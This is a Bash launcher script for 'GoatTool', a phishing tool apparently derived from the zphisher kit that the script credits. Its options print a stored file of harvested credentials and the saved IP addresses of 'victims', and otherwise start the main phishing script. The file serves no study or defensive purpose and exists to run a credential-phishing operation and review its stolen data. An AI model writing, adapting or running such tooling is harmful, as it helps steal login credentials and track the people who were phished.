#!/bin/bash

# https://github.com/htr-tech/zphisher

if [[ $(uname -o) == *'Android'* ]];then
	GOATTOOL_ROOT="/data/data/com.termux/files/usr/opt/goattool"
else
	export GOATTOOL_ROOT="/opt/goattool"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run GoatTool type \`goattool\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $GOATTOOL_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $GOATTOOL_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $GOATTOOL_ROOT
	bash ./goattool.sh
fi
